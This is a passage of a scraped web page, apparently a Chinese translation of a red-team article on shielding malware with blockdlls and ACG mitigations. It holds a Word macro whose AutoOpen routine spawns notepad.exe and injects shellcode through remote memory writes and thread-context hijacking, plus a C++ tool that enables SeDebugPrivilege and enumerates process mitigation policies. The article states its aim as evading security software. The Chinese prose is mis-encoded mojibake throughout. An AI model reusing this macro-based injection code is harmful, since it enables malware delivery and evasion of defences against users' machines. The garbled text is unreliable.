As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON ' and PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1010 ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's and disallow dynamic code result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, as this isn't blocked from alloc outside the process (and ... yolo)) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For Offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(Offset) result = WriteProcessMemory(pi.hProcess, alloc + Offset, myByte, 1, ByVal 0&amp;) Next Offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>æ‰€ä»¥é€™å°æ–¼ä¿è­·æˆ‘å€‘æ­£åœ¨æ´¾ç”Ÿçš„é€²ç¨‹æ˜¯å¾ˆå¥½çš„ï¼Œä½†æ˜¯å¦‚æœç•¶æˆ‘å€‘æƒ³å°‡ä¸€äº›ä»£ç¢¼æ³¨å…¥ä¸€å€‹å·²ç¶“è¢«ACGä¿è­·çš„é€²ç¨‹æ™‚å‘¢ï¼Ÿæˆ‘è½åˆ°çš„ä¸€å€‹å¸¸è¦‹çš„èª¤è§£æ˜¯ï¼Œæˆ‘å€‘ç„¡æ³•å°‡ä»£ç¢¼æ³¨å…¥åˆ°å—ACGä¿è­·çš„é€²ç¨‹ä¸­ï¼Œæˆ‘å€‘é‚„éœ€è¦æŸç¨®å½¢å¼çš„å¯å¯«å’Œå¯åŸ·è¡Œçš„å…§å­˜ã€‚ä½†å¯¦éš›ä¸Šï¼ŒACGä¸¦ä¸é˜»æ­¢é ç¨‹é€²ç¨‹èª¿ç”¨VirtuAllocExç­‰å‡½æ•¸ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘å€‘ä½¿ç”¨ä¸€äº›ç°¡å–®çš„shellcodeå»æ´¾ç”Ÿå‡ºcmd.exeï¼Œä¸¦å°‡å…¶æ³¨å…¥åˆ°ACGä¿è­·çš„é€²ç¨‹ä¸­ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24065b9494f84f0c932a071a31a58cc2><p class=pgc-img-caption></p></div><p>æ‡‰è©²æ³¨æ„çš„æ˜¯ï¼ŒCobalt Strikeçš„beaconç›®å‰ç„¡æ³•ä½¿ç”¨é€™ç¨®æ–¹æ³•ï¼Œå› ç‚ºä¾è³´å‘RWXåˆ†é…å’Œä¿®æ”¹å…§å­˜é ã€‚æˆ‘å˜—è©¦äº†ä¸€äº›ä¸åŒçš„å¯æ“´å±•é…ç½®æ–‡ä»¶é¸é …ä¾†è§£æ±ºé€™å€‹å•é¡Œï¼ˆä¸»è¦å’Œuserwxæœ‰é—œçš„é¸é …ï¼‰ï¼Œä½†ç›®å‰çœ‹ä¾†ä¸è¡Œã€‚</p><h1>æ“ä½œäº‹é …</h1><p>ç¾åœ¨ï¼Œæˆ‘å€‘è¦å°‡é€™äº›ç­–ç•¥é€²è¡Œæ•´åˆã€‚ä¾‹å¦‚ï¼Œåœ¨é–‹å§‹ç”Ÿæˆä»»æ„é€²ç¨‹æ™‚ï¼Œå¯ä»¥ç”¨PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONé€²è¡Œä¿è­·ã€‚</p><p>æˆ‘å€‘é‚„å¸Œæœ›ç”¨æŸå€‹ç­–ç•¥æšèˆ‰å‡ºæ‰€æœ‰çš„é€²ç¨‹ã€‚é€šéPowershellå‘½ä»¤Get-ProcessMigrationï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“è¨»å†Šè¡¨ä¸­å®šç¾©çš„æ‰€æœ‰ç­–ç•¥ï¼Œè€Œä¸”æˆ‘å€‘ä¹ŸçŸ¥é“é‚„æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å°é€²ç¨‹é€²è¡Œä¿è­·ï¼Œä¾‹å¦‚setMigrationPolicy APIï¼Œæ­¤å¤–é‚„å¯ä»¥é€šéCreateProcessAç”Ÿæˆä»»æ„é€²ç¨‹ã€‚</p><p>ç‚ºäº†ç¢ºä¿æ­£ç¢ºåœ°åˆ†ææ¯å€‹é€²ç¨‹ï¼Œæˆ‘å€‘éœ€è¦ä¸€å€‹ç°¡å–®çš„å·¥å…·ï¼Œå¦‚ä¸‹å·¥å…·å°‡ä½¿ç”¨GetProcessMitigationPolicyä¾†è­˜åˆ¥ç­–ç•¥çš„åˆ†é…ï¼š</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;processthreadsapi.h&gt;bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);void GetProtection(int pid, const char *exe) { PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy; PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signaturePolicy; HANDLE pHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid); if (pHandle == INVALID_HANDLE_VALUE) { printf("[!] Error opening handle to %d\n", pid); return; } // Actually retrieve the mitigation policy for ACG if (!GetProcessMitigationPolicy(pHandle, ProcessDynamicCodePolicy, &amp;dynamicCodePolicy, sizeof(dynamicCodePolicy))) { printf("[!] Could not enum PID %d [%d]\n", pid, GetLastError()); return; } if (dynamicCodePolicy.ProhibitDynamicCode) { printf("[%s] - ProhibitDynamicCode\n", exe); } if (dynamicCodePolicy.AllowRemoteDowngrade) { printf("[%s] - AllowRemoteDowngrade\n", exe); } if (dynamicCodePolicy.AllowThreadOptOut) { printf("[%s] - AllowThreadOptOut\n", exe); } // Retrieve mitigation policy for loading arbitrary DLLs if (!GetProcessMitigationPolicy(pHandle, ProcessSignaturePolicy, &amp;signaturePolicy, sizeof(signaturePolicy))) { printf("Could not enum PID %d\n", pid); return; } if (signaturePolicy.AuditMicrosoftSignedOnly) { printf("[%s] AuditMicrosoftSignedOnly\n", exe); } if (signaturePolicy.AuditStoreSignedOnly) { printf("[%s] - AuditStoreSignedOnly\n", exe); } if (signaturePolicy.MicrosoftSignedOnly) { printf("[%s] - MicrosoftSignedOnly\n", exe); } if (signaturePolicy.MitigationOptIn) { printf("[%s] - MitigationOptIn\n", exe); } if (signaturePolicy.StoreSignedOnly) { printf("[%s] - StoreSignedOnly\n", exe); }}int main(){ HANDLE snapshot; PROCESSENTRY32 ppe; HANDLE accessToken; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;accessToken)) { printf("[!] Error opening process token\n"); return 1; } // Provide ourself with SeDebugPrivilege to increase our enumeration chances SetPrivilege(accessToken, SE_DEBUG_NAME); // Prepare handle to enumerate running processes snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf("[!] Error: CreateToolhelp32Snapshot\n"); return 2; } ppe.dwSize = sizeof(PROCESSENTRY32); Process32First(snapshot, &amp;ppe); do { // Enumerate process mitigations GetProtection(ppe.th32ProcessID, ppe.szExeFile); } while (Process32Next(snapshot, &amp;ppe));}bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) { TOKEN_PRIVILEGES tp; LUID luid; if (!LookupPrivilegeValue( NULL, lpszPrivilege, &amp;luid)) { printf("[!] LookupPrivilegeValue error: %u\n", GetLastError()); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges( hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) { printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError()); return FALSE; } return TRUE;}</pre><p>ç¶“éæˆ‘å°Windows 10çš„æ¸¬è©¦ï¼Œç™¼ç¾å·²æœ‰å¹¾å€‹é€²ç¨‹æ‡‰ç”¨äº†å®‰å…¨ç­–ç•¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/0942282201f74b329b2692a6ac84cc21><p class=pgc-img-caption></p></div><p>é€™äº›é€²ç¨‹ä¸»è¦åœç¹Edgeã€‚ç•¶ç„¶æˆ‘å€‘ä¹Ÿæœ‰è¨±å¤šå…¶ä»–é¸æ“‡ï¼Œä¾‹å¦‚fontdrvhost.exeå’Œdllhost.exeã€‚</p><p>å¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½çµ¦ä½ åœ¨æ»²é€æ¸¬è©¦æœŸé–“èº²é¿å®‰å…¨è»Ÿä»¶çš„æª¢æ¸¬æä¾›ä¸€äº›æ€è·¯ã€‚</p><p>æœ¬æ–‡ç”±ç™½å¸½å½™æ•´ç†ä¸¦ç¿»è­¯ï¼Œä¸ä»£è¡¨ç™½å¸½åŒ¯ä»»ä½•è§€é»å’Œç«‹å ´</p><p>ä¾†æºï¼šhttps://nosec.org/home/detail/3131.html</p><p>åŸæ–‡ï¼šhttps://blog.xpnsec.com/protecting-your-malware/</p><p>ç™½å¸½åŒ¯å¾äº‹ä¿¡æ¯å®‰å…¨ï¼Œå°ˆæ³¨æ–¼å®‰å…¨å¤§æ•¸æ“šã€ä¼æ¥­å¨è„…æƒ…å ±ã€‚</p><p>å…¬å¸ç”¢å“ï¼šFOFA-ç¶²çµ¡ç©ºé–“å®‰å…¨æœç´¢å¼•æ“ã€FOEYE-ç¶²çµ¡ç©ºé–“æª¢ç´¢ç³»çµ±ã€NOSEC-å®‰å…¨è¨Šæ¯å¹³è‡ºã€‚</p><p>ç‚ºæ‚¨æä¾›ï¼šç¶²çµ¡ç©ºé–“æ¸¬ç¹ªã€ä¼æ¥­è³‡ç”¢æ”¶é›†ã€ä¼æ¥­å¨è„…æƒ…å ±ã€æ‡‰æ€¥éŸ¿æ‡‰æœå‹™ã€‚</p></div></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>blockdlls</a></li><li><a>ACG</a></li><li><a>ä¿è­·</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/4f3d4ceb.html alt="é»ƒæ²³æµåŸŸä¿è­· | å‘¨æ™‰å³°ï¼šæ¡ç ‚å•é¡Œäº‹é—œç”Ÿç‰©å¤šæ¨£æ€§èˆ‡é£Ÿå“å®‰å…¨" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/c875f033313740458476cd1ee9d05bce style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/4f3d4ceb.html title="é»ƒæ²³æµåŸŸä¿è­· | å‘¨æ™‰å³°ï¼šæ¡ç ‚å•é¡Œäº‹é—œç”Ÿç‰©å¤šæ¨£æ€§èˆ‡é£Ÿå“å®‰å…¨">é»ƒæ²³æµåŸŸä¿è­· | å‘¨æ™‰å³°ï¼šæ¡ç ‚å•é¡Œäº‹é—œç”Ÿç‰©å¤šæ¨£æ€§èˆ‡é£Ÿå“å®‰å…¨</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/930693d7.html alt=ä¿è­·å¤ªç©ºé›»å­è¨­å‚™çš„ææ–™å¦‚ä½•æ¸›è¼•é‡é‡ï¼Ÿæ–°æŠ€è¡“ï¼šæ·»åŠ ç”Ÿé½ç²‰æœ« class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/7edb0c835071408a85277eec5651718a style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/930693d7.html title=ä¿è­·å¤ªç©ºé›»å­è¨­å‚™çš„ææ–™å¦‚ä½•æ¸›è¼•é‡é‡ï¼Ÿæ–°æŠ€è¡“ï¼šæ·»åŠ ç”Ÿé½ç²‰æœ«>ä¿è­·å¤ªç©ºé›»å­è¨­å‚™çš„ææ–™å¦‚ä½•æ¸›è¼•é‡é‡ï¼Ÿæ–°æŠ€è¡“ï¼šæ·»åŠ ç”Ÿé½ç²‰æœ«</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/43435e3f.html alt=é›»å·¥å¸¸ç”¨æº«åº¦ä¿è­·å…ƒå™¨ä»¶å¤§è§€ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/ea35f6a9d06e42a1840b6ba12d553612 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/43435e3f.html title=é›»å·¥å¸¸ç”¨æº«åº¦ä¿è­·å…ƒå™¨ä»¶å¤§è§€>é›»å·¥å¸¸ç”¨æº«åº¦ä¿è­·å…ƒå™¨ä»¶å¤§è§€</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/55e85624.html alt="18å€‹è‡ªæˆ‘ä¿è­·æŠ€å·§ è®“å±éšªé é›¢ä½ " class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/56bb2bf4051a46b89e155cd69f54ab76 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/55e85624.html title="18å€‹è‡ªæˆ‘ä¿è­·æŠ€å·§ è®“å±éšªé é›¢ä½ ">18å€‹è‡ªæˆ‘ä¿è­·æŠ€å·§ è®“å±éšªé é›¢ä½ </a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/02bddf38.html alt=6å€‹è‡ªæˆ‘ä¿è­·å°å•ç­”ï¼Œå­©å­ä¸Šå°å­¸å‰è¦æ•™æœƒä»–ï¼Œå»ºè­°æ”¶è— class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/4770b3fdfb2b4b77ada068011323a976 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/02bddf38.html title=6å€‹è‡ªæˆ‘ä¿è­·å°å•ç­”ï¼Œå­©å­ä¸Šå°å­¸å‰è¦æ•™æœƒä»–ï¼Œå»ºè­°æ”¶è—>6å€‹è‡ªæˆ‘ä¿è­·å°å•ç­”ï¼Œå­©å­ä¸Šå°å­¸å‰è¦æ•™æœƒä»–ï¼Œå»ºè­°æ”¶è—</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/243074c4.html alt=â€œè‡ªæˆ‘ä¿è­·æ„è­˜â€å°å­©å­å¾ˆé‡è¦ï¼Œçˆ¶æ¯æŠ“ä½3é»åŸ¹é¤Šï¼Œæ—©çŸ¥æ—©å—ç›Š class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/3af07d4b59454f4983759a5662ce5522 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/243074c4.html title=â€œè‡ªæˆ‘ä¿è­·æ„è­˜â€å°å­©å­å¾ˆé‡è¦ï¼Œçˆ¶æ¯æŠ“ä½3é»åŸ¹é¤Šï¼Œæ—©çŸ¥æ—©å—ç›Š>â€œè‡ªæˆ‘ä¿è­·æ„è­˜â€å°å­©å­å¾ˆé‡è¦ï¼Œçˆ¶æ¯æŠ“ä½3é»åŸ¹é¤Šï¼Œæ—©çŸ¥æ—©å—ç›Š</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8a1c031e.html alt=äººæ€§æ¼«ç•«ï¼šè«‹ä½ æ‡‚å¾—è‡ªæˆ‘ä¿è­· class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/6fa677270c614030982cc0eb9596ed7c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8a1c031e.html title=äººæ€§æ¼«ç•«ï¼šè«‹ä½ æ‡‚å¾—è‡ªæˆ‘ä¿è­·>äººæ€§æ¼«ç•«ï¼šè«‹ä½ æ‡‚å¾—è‡ªæˆ‘ä¿è­·</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/56b76b13.html alt=äººè‡ªæˆ‘ä¿è­·æœ‰å“ªäº›å¿ƒç†ï¼Ÿé€™15ç¨®è¡Œç‚ºèªªæ˜ä½ åœ¨è‡ªæˆ‘ä¿è­· class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/5083ffb0686a4b459365b08757c98740 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/56b76b13.html title=äººè‡ªæˆ‘ä¿è­·æœ‰å“ªäº›å¿ƒç†ï¼Ÿé€™15ç¨®è¡Œç‚ºèªªæ˜ä½ åœ¨è‡ªæˆ‘ä¿è­·>äººè‡ªæˆ‘ä¿è­·æœ‰å“ªäº›å¿ƒç†ï¼Ÿé€™15ç¨®è¡Œç‚ºèªªæ˜ä½ åœ¨è‡ªæˆ‘ä¿è­·</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/69f3f60a.html alt=ä»Šæ—¥è©±é¡Œä¸¨ç–«æƒ…è¥²ä¾†ï¼Œå¦‚ä½•è‡ªæˆ‘ä¿è­·ï¼Œåšä¸€å€‹è² è²¬ä»»çš„å…¬æ°‘ï¼Ÿ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/RoXDJ4BCatGFSF style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/69f3f60a.html title=ä»Šæ—¥è©±é¡Œä¸¨ç–«æƒ…è¥²ä¾†ï¼Œå¦‚ä½•è‡ªæˆ‘ä¿è­·ï¼Œåšä¸€å€‹è² è²¬ä»»çš„å…¬æ°‘ï¼Ÿ>ä»Šæ—¥è©±é¡Œä¸¨ç–«æƒ…è¥²ä¾†ï¼Œå¦‚ä½•è‡ªæˆ‘ä¿è­·ï¼Œåšä¸€å€‹è² è²¬ä»»çš„å…¬æ°‘ï¼Ÿ</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/bc6a7447.html alt=åšäººï¼Œè¦æ‡‚å¾—è‡ªæˆ‘ä¿è­· class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/66b70002373208920316 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/bc6a7447.html title=åšäººï¼Œè¦æ‡‚å¾—è‡ªæˆ‘ä¿è­·>åšäººï¼Œè¦æ‡‚å¾—è‡ªæˆ‘ä¿è­·</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/2e0bd407.html alt=åƒé‡Œä¹‹å¤–ï¼Œå¦‚ä½•åšå¥½è‡ªæˆ‘ä¿è­·ï¼Ÿ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/RmMGFKaEGZ7hz0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/2e0bd407.html title=åƒé‡Œä¹‹å¤–ï¼Œå¦‚ä½•åšå¥½è‡ªæˆ‘ä¿è­·ï¼Ÿ>åƒé‡Œä¹‹å¤–ï¼Œå¦‚ä½•åšå¥½è‡ªæˆ‘ä¿è­·ï¼Ÿ</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/1803c987.html alt=åŸ¹é¤Šè‡ªæˆ‘ä¿è­·èƒ½åŠ›ä¸€æ•™å­©å­å®ˆè¡›è‡ªå·±çš„ç”Ÿå‘½ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/8123c1a8d76d4f9bb110d37e30de5f58 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/1803c987.html title=åŸ¹é¤Šè‡ªæˆ‘ä¿è­·èƒ½åŠ›ä¸€æ•™å­©å­å®ˆè¡›è‡ªå·±çš„ç”Ÿå‘½>åŸ¹é¤Šè‡ªæˆ‘ä¿è­·èƒ½åŠ›ä¸€æ•™å­©å­å®ˆè¡›è‡ªå·±çš„ç”Ÿå‘½</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b6d12ce0.html alt=å¦‚ä½•å¾å–„è‰¯èµ°å‘å‹‡æ•¢ï¼šå­¸æœƒè‡ªæˆ‘ä¿è­· class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/dfic-imagehandler/2533e60b-43cf-4f3b-b228-9f35f15c83b0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b6d12ce0.html title=å¦‚ä½•å¾å–„è‰¯èµ°å‘å‹‡æ•¢ï¼šå­¸æœƒè‡ªæˆ‘ä¿è­·>å¦‚ä½•å¾å–„è‰¯èµ°å‘å‹‡æ•¢ï¼šå­¸æœƒè‡ªæˆ‘ä¿è­·</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/eb6286c5.html alt=å¦‚ä½•æé«˜è‡ªæˆ‘ä¿è­·èƒ½åŠ›ï¼Ÿé€™8æ¢æ³•å‰‡ï¼Œå€¼å¾—æ¯å€‹çˆ¶æ¯å’Œå­©å­çœ‹çœ‹ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/153149234557338aa044f5c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/eb6286c5.html title=å¦‚ä½•æé«˜è‡ªæˆ‘ä¿è­·èƒ½åŠ›ï¼Ÿé€™8æ¢æ³•å‰‡ï¼Œå€¼å¾—æ¯å€‹çˆ¶æ¯å’Œå­©å­çœ‹çœ‹>å¦‚ä½•æé«˜è‡ªæˆ‘ä¿è­·èƒ½åŠ›ï¼Ÿé€™8æ¢æ³•å‰‡ï¼Œå€¼å¾—æ¯å€‹çˆ¶æ¯å’Œå­©å­çœ‹çœ‹</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/58704c1a.html alt=å¦‚ä½•è®“å­©å­å­¸æœƒè‡ªæˆ‘ä¿è­·ï¼Ÿå®¶é•·åšå¥½é€™å¹¾é»ï¼Œä¸åœ¨ä»–èº«é‚Šä¹Ÿèƒ½æ”¾å¿ƒ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/RKMrG1R3MogCdH style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/58704c1a.html title=å¦‚ä½•è®“å­©å­å­¸æœƒè‡ªæˆ‘ä¿è­·ï¼Ÿå®¶é•·åšå¥½é€™å¹¾é»ï¼Œä¸åœ¨ä»–èº«é‚Šä¹Ÿèƒ½æ”¾å¿ƒ>å¦‚ä½•è®“å­©å­å­¸æœƒè‡ªæˆ‘ä¿è­·ï¼Ÿå®¶é•·åšå¥½é€™å¹¾é»ï¼Œä¸åœ¨ä»–èº«é‚Šä¹Ÿèƒ½æ”¾å¿ƒ</a></li><hr></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>